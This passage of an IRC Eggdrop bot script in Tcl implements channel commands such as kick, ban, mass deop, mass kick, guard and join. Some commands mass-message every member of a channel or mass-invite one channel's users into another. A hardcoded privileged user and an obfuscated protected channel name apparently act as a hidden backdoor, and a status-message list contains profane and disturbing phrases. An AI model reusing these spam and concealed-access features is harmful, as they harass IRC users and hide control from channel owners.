if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -kooooo $mreq $rest"
} {
putserv "MODE $chan -ooooo $rest"
}
} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -ko $mreq $nick"
} {
putserv "MODE $chan -o $nick"
}
}
return 0
}
proc pub_mdeop {nick uhost hand chan rest} {
global botnick notc
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {$nick != "*"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
}
set nicks ""
set i 0
set members [chanlist $chan]
foreach x $members {
if {([isop $x $chan]) && (![matchattr $x m]) && ($x != $botnick)} {
if {$i == 5} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -kooooo 4ADmIN.ReQuesT $nicks"
} {
putserv "MODE $chan -ooooo $nicks"
}
set nicks ""
append nicks " $x"
set i 1
} {
append nicks " $x"
incr i
}
}
}
putserv "MODE $chan -oooooo $nicks"
}
proc pub_kick {nick uhost hand chan rest} {
global botnick notc ps owner
if {![isop $botnick $chan]} { return 0 }
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: kick <nick|host> <reason>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set reason [lrange $rest 1 end]
set handle [lindex $rest 0]
if {$reason == ""} {
if {[matchattr $nick m]} {
set reason "1MasTeR 4KIcK1 ReQuesT4..!"
}
if {[matchattr $nick n]} {
set reason "1ADmIN 4KIcK1 ReQuesT4..!"
}
}
if {[string match "*@*" $handle]} {
foreach knick [chanlist $chan] {
if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} {
if {[matchattr $knick f] || $knick != $botnick} {
putsrv "KICK $chan $knick :$notc $reason [banmsg]"
}
}
}
return 0
}
if {$handle == $botnick} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, Can't kick my self."
return 0
}
if {($handle == $ps) || ($handle == $owner)} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[matchattr $handle n] && ![matchattr $nick Z]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, CaNT KIcK ADmIN FLAg"
return 0
}
putsrv "KICK $chan $handle :$notc $reason [banmsg]"
return 0
}
proc pub_mkick {nick uhost hand chan rest} {
global botnick notc
if {$rest != ""} {
set chan [lindex $rest 0]
set reason [lrange $rest 1 end]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
} else {
set reason $rest
}
if {(![validchan $chan]) || (![isop $botnick $chan])} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$reason == ""} {
set reason "1ADmIN 4MaSSKIcK1 ReQuesT4..!"
}
set members [chanlist $chan]
foreach x $members {
if {(![matchattr $x f]) && ($x != $botnick)} {
putsrv "KICK $chan $x :$notc $reason [banmsg]"
}
}
}
proc pub_kickban {nick uhost hand chan rest} {
global botnick notc bannick ps owner
if {![isop $botnick $chan]} { return 0 }
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: kickban <nick|host> <reason>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: kickban <nick> <reason>"
return 0
}
set reason [lrange $rest 1 end]
set handle [lindex $rest 0]
if {$reason == ""} {
if {[matchattr $nick m]} {
set reason "1MasTeR 4KIcKBaN1 ReQuesT"
}
if {[matchattr $nick n]} {
set reason "1ADmIN 4KIcKBaN1 ReQuesT"
}
}
if {[string match "*@*" $handle]} {
set mfisrt "T"
foreach knick [chanlist $chan] {
if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} {
if {[matchattr $knick f] || $knick != $botnick} {
if {$mfirst == "T"} {
set bannick($knick) $handle
set mfirst "F"
}
putsrv "KICK $chan $knick :$notc $reason [banmsg]"
}
}
}
return 0
}
if {![onchan $handle $chan]} { return 0 }
set hostmask [getchanhost $handle $chan]
set hostmask "*!*@[lindex [split $hostmask @] 1]"
if {$handle == $botnick} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, Can't kick my self."
return 0
}
if {($handle == $ps) || ($handle == $owner)} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[matchattr $handle n] && ![matchattr $nick Z]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, CaNT KIcK ADmIN FLaG"
return 0
}
set bannick($handle) $hostmask
putsrv "KICK $chan $handle :$notc $reason [banmsg]"
return 0
}
proc pub_ban {nick uhost hand channel rest} {
global botnick notc ps owner
if {![isop $botnick $channel]} { return 0 }
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: ban <nick/hostmask>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set handle [lindex $rest 0]
if {$handle == $botnick} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, can't ban my self"
return 0
}
if {($handle == $ps) || ($handle == $owner)} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[matchattr $handle n]} {
puthlp "NOTICE $nick :$notc4 !4ReJeCTeD!10!, cant ban ADmIN"
return 0
}
set hostmask [getchanhost $handle $channel]
set hostmask "*!*@[lindex [split $hostmask @] 1]"
if {![onchan $handle $channel]} {
set hostmask [lindex $rest 0]
}
if {$hostmask != "*!*@*"} {
putserv "MODE $channel +b $hostmask"
}
}
proc pub_unban {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: unban <nick/hostmask> <#channel>"
return 0
}
if {[lindex $rest 1] != ""} {
set chan [lindex $rest 1]
}
if {[string first # $chan] != 0} {
set chan "#$chan"
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set handle [lindex $rest 0]
append userhost $handle "!*" [getchanhost $handle $chan]
set hostmask [maskhost $userhost]
if {![onchan $handle $chan]} {
set hostmask [lindex $rest 0]
}
putserv "MODE $chan -b $hostmask"
puthlp "NOTICE $nick :$notc UnBaN [unsix $hostmask] ON $chan"
}
proc pub_up {nick uhost hand channel rest} {
global notc botnick unop
catch {unset unop($nick)}
if {![isop $botnick $channel]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
putsrv "ChanServ op $channel $botnick"
return 0
}
proc pub_down {nick uhost hand channel rest} {
global notc botnick
if {![isop $botnick $channel]} {
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[matchattr $nick m]} {
set mreq "4MasTeR.ReQuesT"
}
if {[matchattr $nick n]} {
set mreq "4ADmIN.ReQuesT"
}
if {[isop $nick $channel]} {
if {![string match "*k*" [getchanmode $channel]]} {
putserv "mode $channel -ko $mreq $nick"
} {
putserv "mode $channel -o $nick"
}
}
return 0
}
proc pub_munbans {nick uhost hand chan rest} {
global notc botnick
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan] != 0} {
set chan "#$chan"
}
}
if {![validchan $chan] || ![isop $botnick $chan]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set bans ""
set i 0
foreach x [chanbans $chan] {
if {$i < 5} {
append bans " [lindex $x 0]"
set i [incr i]
}
if {$i == 5} {
puthelp "MODE $chan -bbbbb $bans"
set bans ""
append bans " [lindex $x 0]"
set i 0
}
}
puthelp "MODE $chan -bbbbb $bans"
if {![onchan $nick $chan]} {
puthlp "NOTICE $nick :$notc MuNBaNS \[$chan\]"
}
return 0
}
proc pub_banlist {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan] != 0} {
set chan "#$chan"
}
}
if {![validchan $chan]} {
puthlp "NOTICE $nick :$notc NoT IN cHaN $chan."
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
foreach x [chanbans $chan] {
puthlp "NOTICE $nick :$notc $x"
}
if {[chanbans $chan] == ""} {
puthlp "NOTICE $nick :$notc BaNLIsT $chan <n/a>"
}
return 0
}
proc pub_mode {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
puthelp "NOTICE $nick :$notc Usage: mode +/- ntspnmcilk"
return 0
}
putserv "mode $chan $rest"
}
proc pub_say {nick uhost hand channel rest} {
global notc lenc uenc ldec udec
if {$rest==""} {
puthlp "NOTICE $nick :$notc Usage: say <msg>"
}
puthlp "PRIVMSG $channel :$rest"
}
set rms {
"10wend.4DESTROYER"
"10Checking.4BOOM"
"10Hacking.4R00T"
"10Surfing.With.The.4ALIEN"
"10Checking.4SHELLS"
"10Love.Fucking.My.4GIRLS"
"10True.4LOVE10.Never.End"
"10Finding.True.4LOVE"
"10Looking.4FOR10.Playback"
"10Nothing.4BETTER"
"10Hacker.4STAFF"
"10Guardian.4STAFF"
"10Fucking.4ASSHOLE"
"10The.Roof.Is.on.4FIRE"
"10Pay.Back.4TIME"
"4EYE10.cry"
"4WORLD10.Of.Fiction"
"4KILLING.On.10Adrenaline"
"10Suffer.The.4CHILDREN"
"10Making.4LOVE"
"10Have.a.Nice.4DAY"
"10a.War.Inside.my.4HEAD"
"10Desperate.4CRY"
"10Spam.4CHECKS"
"10Inviter.4CHECKS"
"10Praying.4SHIT"
"10Sudden.4DEATH"
"10Be.Right.4BACK"
"10Making.4LOVE"
"10Fucking.In.4HEAVEN"
"10Going.To.4HELL"
"10Kicking.4ASS"
"10Farting.Out.4LOUD"
"10Playing.Counter.4STRIKE"
"4LISTENING10.To.Korn.Mp3"
"4SCREAMING10.Still.Dead"
"4RIPPING10.Someone"
"10Kindaping.4KIDDO"
"4RIPPING10.arn.tcl"
"4RIPPING10.Some.Chicks"
"4MAKING10.Money"
"4PARKING10.Tons.Of.Them"
"10Blaming.4GOD"
"10Yelling.Ma.4BITCH"
"10Spitting.4SATAN"
"10Searching.Something.To.4EAT"
"10Back.To.Real.4LIFE"
"4TAKING10.Shower"
"10Reclaiming.4MYSELF"
"10Seeking.4HELP"
"10Shooting.The.4DOGS"
"4DEAD"
"4Jancok!"
"4asnu!"
"4Jablay!"
}
proc auto_resync {} {
global botnick rms
foreach chan [channels] {
if {[string match "*+resync*" [channel info $chan]]} {
if {[onchan $botnick $chan] && [isop $botnick $chan] && ![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan +v-k $botnick [lindex $rms [rand [llength $rms]]]"
}
}
}
if {![string match *auto_resync* [timers]]} {
timer 5 auto_resync
}
return
}
if {![string match *auto_resync* [timers]]} {
timer 5 auto_resync
}
setudef flag resync
proc pub_+resync {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthelp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*+resync*" [channel info $chan]]} {
puthelp "NOTICE $nick :$notc $chan 4ReADY!!"
return 0
}
catch { channel set $chan +resync }
puthelp "NOTICE $nick :$notc resync $chan \[9ON\]"
saveuser
}
proc pub_-resync {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthelp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*-resync*" [channel info $chan]]} {
puthelp "NOTICE $nick :$notc resync $chan already 4DISaBLE."
return 0
}
catch { channel set $chan -resync }
puthelp "NOTICE $nick :$notc resync $chan \[4Off\]"
saveuser
}
proc pub_resync {nick uhost hand channel rest} {
global botnick vern
set vern2 $vern
regsub -all --  $vern2 "" vern2
if {![string match "*k*" [getchanmode $channel]]} {
putserv "mode $channel -k+v $vern2 $botnick"
} {
putserv "mode $channel -v+v $botnick $botnick"
}
}
proc pub_notice {nick uhost hand channel rest} {
global notc
if {$rest==""} {
puthlp "NOTICE $nick :$notc Usage: notice <nick> <msg>"
}
set person [lindex $rest 0]
set rest [lrange $rest 1 end]
if {$rest!=""} {
puthlp "NOTICE $person :$rest"
return 0
}
}
proc pub_msg {nick uhost hand channel rest} {
global owner notc
if {$rest==""} {
puthlp "NOTICE $nick :$notc Usage: msg <nick> <msg>"
}
set person [string tolower [lindex $rest 0]]
set rest [lrange $rest 1 end]
if {[string match "chanserv" [string tolower $person]] || [string match "nickserv" [string tolower $person]] || [string match "operserv" [string tolower $person]]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10 Can't send message to Service."
return 0
}
if {[string tolower $person] == [string tolower $owner]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
puthlp "PRIVMSG $person :$rest"
}
proc pub_act {nick uhost hand channel rest} {
global notc
if {$rest==""} {
puthlp "NOTICE $nick :$notc Usage: act <msg>"
}
puthlp "PRIVMSG $channel :\001ACTION $rest\001"
return 0
}
proc pub_invite {nick uhost hand chan rest} {
global notc
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: invite <nick> <#channel>"
}
set who [lindex $rest 0]
set tochan [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$tochan != ""} {
if {![onchan $who $tochan]} {
puthlp "INVITE $who :$tochan"
puthlp "NOTICE $nick :$notc InvItE $who To $tochan"
return 0
}
puthlp "NOTICE $nick :$notc $who is already on the $tochan"
}
if {![onchan $who $chan]} {
putsrv "INVITE $who :$chan"
puthlp "NOTICE $nick :$notc Invitation to $chan has been sent to $who"
return 0
}
puthlp "NOTICE $nick :$notc $who is already on the channel"
}
proc msg_Z {nick uhost hand rest} {
global notc
if {[string index $rest 0] != "`" && [string index $rest 0] != "."} { return 0 }
if {![matchattr $nick Z]} { return 0 }
if {[string index [lindex $rest 1] 0] == "#"} {
if {![validchan [lindex $rest 1]]} {
puthlp "NOTICE $nick :$notc NoT IN [lindex $rest 1]"
return 0
}
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4auth 1st!"
return 0
}
set goto [lindex $rest 0]
if {[string index $rest 0] == "."} {
regsub "." $goto "msg_" goto
set rest [lrange $rest 1 end]
catch { $goto $nick $uhost $hand $rest }
return 0
}
regsub -all "`" $goto "pub_" goto
if {[string index [lindex $rest 1] 0] == "#"} {
set chan [lindex $rest 1]
set rest [lrange $rest 2 end]
} else {
set chan "*"
set rest [lrange $rest 1 end]
}
catch { $goto $nick $uhost $hand $chan $rest }
}
proc msg_mmsg {nick uhost hand rest} {
pub_mmsg $nick $uhost $hand "*" $rest
}
proc pub_mmsg {nick uhost hand chan rest} {
global cmd_chn cmd_by cmd_msg cmd_case notc
if {$rest==""} {
puthlp "NOTICE $nick :$notc Usage: mmsg <#channel> <text>"
return 0
}
set tochan [lindex $rest 0]
set txt [lrange $rest 1 end]
if {$txt==""} {
puthlp "NOTICE $nick :$notc Usage: mmsg <#channel> <text>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string first # $tochan] != 0} {
set chan "#$tochan"
}
if {![validchan $tochan]} {
set cmd_chn $tochan
set cmd_msg $rest
set cmd_by $nick
set cmd_case "2"
channel add $tochan
catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
return 0
}
putsrv "NOTICE $nick :$notc STaRTING MaSSMSG $tochan"
set members [chanlist $tochan]
foreach x $members {
if {![isop $x $tochan] && ![matchattr $nick Z]} {
puthlp "PRIVMSG $x :$txt"
}
}
utimer 2 del_nobase
puthlp "NOTICE $nick :$notc MaSSMSG $tochan 4DoNE."
}
proc pub_minvite {nick uhost hand channel rest} {
global cmd_chn cmd_by cmd_msg cmd_case botnick notc
if {$rest==""} {
puthlp "NOTICE $nick :$notc Usage: minvite <#channel> <#to channel>"
}
set chan [lindex $rest 1]
if {$chan == ""} {
set chan $channel
} else {
if {[string first # $chan] != 0} {
set chan "#$chan"
}
}
set tochan [lindex $rest 0]
if {[string first # $tochan] != 0} {
set tochan "#$tochan"
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {![validchan $tochan]} {
set cmd_chn $tochan
set cmd_msg $tochan
set cmd_by $nick

set cmd_case "3"
channel add $tochan
catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
return 0
}
if {[isop $botnick $chan]} {
putserv "mode $chan -o $botnick"
}
putsrv "NOTICE $nick :$notc Starting mass invite to $tochan"
set members [chanlist $tochan]
foreach x $members {
if {(![onchan $x $chan]) && (![isop $x $tochan])} {
putsrv "INVITE $x :$chan"
}
}
utimer 2 del_nobase
puthlp "NOTICE $nick :$notc InVITE $tochan InTO $chan 4DoNE."
}
proc pub_join {nick uhost hand chan rest} {
global botnick joinme own notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set chan [lindex $rest 0]
if {[string first # $chan] != 0} {
set chan "#$chan"
}
if {$chan=="#"} {
puthlp "NOTICE $nick :$notc Usage: join <#channel>"
return 0
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chan]} {
puthlp "NOTICE $nick :$notc $x ReADY!"
return 0
}
}
if {$nick != $own && [total_channel] != 1} {
puthlp "NOTICE $nick :$notc To MaNY cHaNNeL MaX 9..!"
return 0
}
set joinme $nick
channel add $chan
catch { channel set $chan +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
if {[lindex $rest 1] != ""} {
putsrv "JOIN $chan :[lindex $rest 1]"
}
}
proc pub_+chan {nick uhost hand chan rest} {
global botnick joinme owner notc ps
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :$notc 4!BLoCkEd!"
return 0
}
if {$nick != $owner && $nick != $ps} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, oNLy ReAL OwNER can ADD Channel"
return 0
}
set chan [lindex $rest 0]
set opt [lindex $rest 1]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
if {$chan=="#"} {
puthlp "NOTICE $nick :$notc Usage: +chan <#channel>"
return 0
}
if {[validchan $chan]} {
puthlp "NOTICE $nick :$notc $chan is already on channels"
return 0
}
if {$nick != $owner && [total_channel] != 1} {
puthlp "NOTICE $nick :$notc TO MaNY cHaNNeL MaX 9..!"
return 0
}
set joinme $nick
channel add $chan
if {$opt != "" && [string tolower $opt] == "+nopart"} {
catch { channel set $chan -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
} else {
catch { channel set $chan -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
}
savechan
if {[lindex $rest 1] != ""} {
putsrv "JOIN $chan :[lindex $rest 1]"
}
}
proc total_channel {} {
global notc
set total_chan 0
foreach x [channels] {
incr total_chan
}
if {$total_chan > 9} { return 0 }
return 1
}
proc pub_part {nick uhost hand chan rest} {
global notc ps quick
set curtime [ctime [unixtime]]
set part_msg [lrange $rest 1 end]
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $rest]!=0} {
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {$nick != $ps && [string tolower $chan] == [dezip [lines "9MJu6/A2i8/0"]]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*+secret*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc $chan 4PRoTecTEd..!"
return 0
}
if {![onchan $nick $chan]} {
putsrv "NOTICE $nick :$notc PaRT $chan"
}
if {$part_msg != ""} {
if {$quick == "1"} {
putqck "PART $chan :$part_msg"
} {
putsrv "PART $chan :$part_msg"
}
} {
if {$quick == "1"} {
putqck "PART $chan :BackToBase (On $curtime)"
} {
putsrv "PART $chan :BackToBase (On $curtime)"
}
}
channel remove $chan
savechan
return 0
}
set lockchan ""
proc pub_+invitelock {nick uhost hand chan rest} {
global lockchan notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $rest]!=0} {
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
puthlp "NOTICE $nick :$notc InVITE cHaN $chan \[9ON\]"
set lockchan $chan
return 0
}
proc pub_-invitelock {nick uhost hand chan rest} {
global lockchan notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $rest]!=0} {
set chan "#$chan"
}
}
if {![validchan $chan] || $lockchan == ""} { return 0 }
set lockchan ""
puthlp "NOTICE $nick :$notc InvItE cHaN $chan \[4OFF\]"
return 0
}
proc cycle {chan} {
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![string match "*c*" [getchanmode $chan]]} {
set text [cyclemsg]
} {
set text "((((cycle))))"
}
putsrv "PART $chan :$text"
if {[matchattr $cflag K]} {
putsrv "JOIN $chan :[dezip [getuser $cflag XTRA "CI"]]"
} {
putsrv "JOIN $chan"
}
if {[matchattr $cflag C]} {
if {![istimer "cycle $chan"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $chan] }
}
}
proc pub_cycle {nick uhost hand chan rest} {
global notc
set rest [lindex $rest 0]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest==""} {
if {![onchan $nick $chan]} {
puthlp "NOTICE $nick :$notc cYcLE $chan"
}
cycle $chan
return 0
} else {
if {[string index $rest 0] != "#"} {
set rest "#$rest"
}
if {[botonchan $rest]} { cycle $rest }
}
}
bind kick - * kick_counter
proc pub_+massjoin {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
foreach x [userlist A] {
chattr $x +J
}
puthlp "NOTICE $nick :$notc ALL MaSsJoIN CHaNNeL \[9ON\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[matchattr $cflag J]} {
puthlp "NOTICE $nick :$notc MaSsJoIN $chan \[9ON\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +J
puthlp "NOTICE $nick :$notc MaSsJoIN $chan \[9ON\]"
saveuser
}
proc pub_-massjoin {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
foreach x [userlist A] {
chattr $x -J
}
puthlp "NOTICE $nick :$notc ALL MaSsJoIN CHaNNeL \[9ON\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {![matchattr $cflag J]} {
puthlp "NOTICE $nick :$notc MaSsJoIN $chan \[4OFF\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -J
puthlp "NOTICE $nick :$notc MaSsJoIN $chan \[4OFF\]"
saveuser
}
set kickcounter "scripts/kicks.dat"
proc kick_counter {nick uhost handle chan target arg} {
global botnick kickcounter
if {[string tolower $target] == [string tolower $botnick]} { return 0 }
if {[string tolower $nick] == [string tolower $botnick]} {
if {![file exists $kickcounter]} {
set file [open $kickcounter w]
puts $file 1
catch {close $file}
}
set file [open $kickcounter r]
set currentkicks [gets $file]
catch {close $file}
set file [open $kickcounter w]
puts $file [expr $currentkicks + 1]
catch {close $file}
}
}
proc pub_+guard {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
foreach x [channels] {
catch { channel set $x +greet flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
set cflag "c$x"
set cflag [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 3
setuser $cflag XTRA "CAPS" 80
}
savechan
puthlp "NOTICE $nick :$notc ALL GuaRd CHaNNeL \[9ON\]"
return 0
}
if {![validchan $chan]} { return 0 }
set cflag "c$chan"
set cflag [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 3
setuser $cflag XTRA "CAPS" 80
if {[string match "*+greet*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc GuARd $chan \[9ON\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan +greet flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
puthlp "NOTICE $nick :$notc GuARD $chan \[9ON\]"
savechan
}
proc pub_-guard {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
foreach x [channels] {
catch { channel set $x -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
set cflag "c$x"
set cflag [string range $cflag 0 8]
chattr $cflag "-hpJSPTRUED"
}
savechan
puthlp "NOTICE $nick :$notc ALL GuaRd cHaN \[4OFF\]"
return 0
}
if {![validchan $chan]} { return 0 }
set cflag "c$chan"
set cflag [string range $cflag 0 8]
chattr $cflag "-hpJSPTRUED"
if {[string match "*-greet*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc GuARD $chan IS \[4OFF\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
puthlp "NOTICE $nick :$notc GuARD $chan \[4OFF\]"
savechan
return 0
}
if {(![file exists $kickcounter])} { set file [open $kickcounter w]; puts $file 1; catch {close $file} }
proc pub_+seen {nick uhost hand chan rest} {
global notc
if {![string match "*seen*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
foreach x [channels] {
catch { channel set $x +seen }
}
savechan
puthlp "NOTICE $nick :$notc ALL SEEN cHaNNeL \[9ON\]"
seen
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*+seen*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc SEEN $chan IS \[9ON\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan +seen }
puthlp "NOTICE $nick :$notc SEEN $chan \[9ON\]"
savechan
seen
}
proc pub_-seen {nick uhost hand chan rest} {
global notc
if {![string match "*seen*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
foreach x [channels] {
catch { channel set $x -seen }
}
savechan
puthlp "NOTICE $nick :$notc ALL SEEN cHaNNeL \[4OFF\]"
seen
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*-seen*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc SEEN $chan IS \[4OFF\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan -seen }
